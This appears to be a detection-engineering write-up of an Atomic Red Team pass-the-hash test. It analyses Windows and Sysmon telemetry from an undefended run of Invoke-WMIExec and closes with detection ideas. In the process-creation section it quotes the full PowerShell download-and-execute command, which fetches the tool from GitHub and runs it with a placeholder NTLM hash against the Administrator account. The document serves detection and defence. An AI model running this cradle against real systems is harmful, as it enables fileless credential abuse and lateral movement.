# T1550.002-3: Pass the Hash — Invoke-WMIExec Pass the Hash

## Technique Context

Pass the Hash (T1550.002) allows authentication using captured NTLM hashes. Invoke-WMIExec is a pure-PowerShell implementation from Kevin Robertson's Invoke-TheHash toolkit that authenticates to Windows Management Instrumentation (WMI) using an NTLM hash without requiring native binaries. The entire attack executes within PowerShell's memory — no executable is dropped to disk. The script is fetched at runtime from GitHub via `Invoke-Expression` (`IEX`) and an `Invoke-WebRequest` (`IWR`) download cradle.

This is a living-off-the-land variant of Pass the Hash: there is no separate binary to block, no hash-match for antivirus, and the network communications use standard WMI ports (TCP 135 and dynamic RPC ports). In the defended variant of this test, Windows Defender's AMSI integration blocked the downloaded script when `IEX` attempted to evaluate it, recording `ScriptContainedMaliciousContent` in PowerShell's error log and preventing execution.

In this undefended run, Defender was disabled. AMSI was still present but without Defender's signatures, and the Invoke-WMIExec script downloaded and ran to completion, as evidenced by the `Write-Host "DONE"` execution success marker in the module log.

## What This Dataset Contains

The dataset spans approximately four seconds of telemetry (2026-03-17T17:18:03Z–17:18:07Z) across four log sources, with 172 total events.

**Security EID 4688 — four process creates recorded:**
The execution chain shows:
1. `whoami.exe` (PID 0x42b0) — ART pre-check
2. Attack `powershell.exe` child (PID 0x3cb4) with the full IEX download-and-execute command:
   ```
   "powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
   IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}
   ```
3. `whoami.exe` (PID 0x44e0) — post-execution check
4. Second `powershell.exe` (PID 0x3998) — cleanup invocation

The command line in event 2 records the target (`$env:COMPUTERNAME` — the local machine `ACME-WS06`), the target account (`Administrator`), the NTLM hash, and the remote command to execute (`hostname`).

**Sysmon EID breakdown — 42 events: 25 EID 7, 4 EID 1, 4 EID 10, 4 EID 11, 3 EID 17, 1 EID 3, 1 EID 22:**
The network activity is the defining undefended artifact:

- **EID 22 (DNS Query)**: `raw.githubusercontent.com` resolved to `185.199.109.133` — confirming the download cradle fired.
- **EID 3 (Network Connection)**: Outbound TCP from `powershell.exe` (PID 15540, `192.168.4.16:51526`) to `185.199.109.133` — the GitHub CDN. This is the actual download of Invoke-WMIExec.ps1 occurring. The connection reaching its destination (not shown as blocked) confirms the script was retrieved.
- **EID 1 (Process Create)**: The attack `powershell.exe` child is tagged `technique_id=T1083,technique_name=File and Directory Discovery` — this Sysmon rule tag reflects the discovery activity within the IEX'd code.
- **EID 11 (File Create)**: Four file creation events, including PowerShell profile data files and temporary files created during the Invoke-WMIExec execution.

The Sysmon EID 7 DLL load sequence for the attack `powershell.exe` (PID 15540) includes both the standard PowerShell CLR libraries and the extra runtime DLLs loaded by Invoke-WMIExec, resulting in a slightly larger EID 7 count than the test framework-only PowerShell process.

**PowerShell — 125 events: 120 EID 4104, 4 EID 4103, 1 EID 4100:**
Unlike the defended run (which had `ScriptContainedMaliciousContent` as the EID 4100 error), this run's EID 4100 is a different error — a runtime exception within the Invoke-WMIExec execution itself rather than an AMSI block. The EID 4104 script block log contains the full download-and-execute payload block (present in both defended and undefended runs). The EID 4103 module log records `Write-Host "DONE"` — the ART test framework success marker confirming the test ran to completion. This is absent from the defended version.

The defended run had only 51 PowerShell events; this undefended run has 125. The additional ~74 events reflect the Invoke-WMIExec script's own PowerShell activity: function definitions, WMI authentication calls, and the `hostname` command output handling all generate script block and module log events.

**Application — 1 EID 15 event:**
Routine Defender state-machine event.

## What This Dataset Does Not Contain

The WMI authentication to the local machine (`$env:COMPUTERNAME`) using the supplied hash requires the hash to correspond to an account that can authenticate via NTLM. The hash used in this test (`cc36cf7a8514893efccd3324464tkg1a`) is the ART placeholder value, not a real domain hash. Invoke-WMIExec likely returned an authentication failure or partial execution rather than successfully executing `hostname` on the target. The dataset does not contain explicit WMI authentication success/failure events — WMI activity is not captured by the instrumentation configuration (no WMI activity auditing is enabled).

There are no Security EID 4624 (Logon) events reflecting an NTLM authentication for the `Administrator` account — this would only appear on the target machine's Security log, and since the target is the local machine, it would appear in this same log. Its absence suggests either the authentication failed (wrong hash) or the WMI logon bypassed standard Security log emission through the network interface.

## Assessment

The key difference from the defended dataset is the presence of Sysmon EID 3 and EID 22 network events documenting actual code delivery, combined with the `Write-Host "DONE"` module log entry indicating the script ran. In the defended run, AMSI fired at the `IEX` evaluation boundary and no WMI communication occurred. Here, the full download, AMSI evaluation (passing), and WMI authentication attempt are all documented. The 125 PowerShell events (vs 51 in the defended run) reflect the Invoke-WMIExec module's own execution trace — all those function definitions and WMI calls appear as script blocks and module log entries. This dataset demonstrates what the unblocked fileless PtH download-and-execute pattern looks like at the PowerShell telemetry layer and is directly useful for understanding the volume inflation that real tool execution creates compared to a blocked attempt.

## Detection Opportunities Present in This Data

1. Security EID 4688 with `ProcessCommandLine` containing both `IEX` (or `Invoke-Expression`) and a GitHub raw content URL — the download-and-execute cradle in a PowerShell command line is a high-confidence indicator even before AMSI evaluation.

2. Sysmon EID 22 (DNS Query) from `powershell.exe` for `raw.githubusercontent.com` combined with a subsequent EID 3 network connection to the corresponding IP — the combination of DNS query and established TCP connection from a script host to a public code repository is anomalous in managed enterprise environments.

3. PowerShell EID 4104 containing `Invoke-WMIExec` or `Invoke-TheHash` function names — these are known tool-specific identifiers with very limited legitimate use.

4. PowerShell EID 4104 containing `-Hash` followed by a 32-character hex string in a WMI or network authentication context — NTLM hash values passed as parameters to PowerShell functions are detectable by pattern.

5. Sysmon EID 3 showing `powershell.exe` making outbound connections to GitHub CDN IPs (`185.199.x.x`) on port 443 during after-hours or from workstations without a software development role — this is an environmental context-dependent indicator but highly effective in tightly managed environments.

6. Volume anomaly: A PowerShell process generating significantly more EID 4104 script block events than baseline peers (125 vs 40-50 for normal ART test framework runs) may indicate a large IEX'd script executed within the session, warranting investigation of what script was loaded.
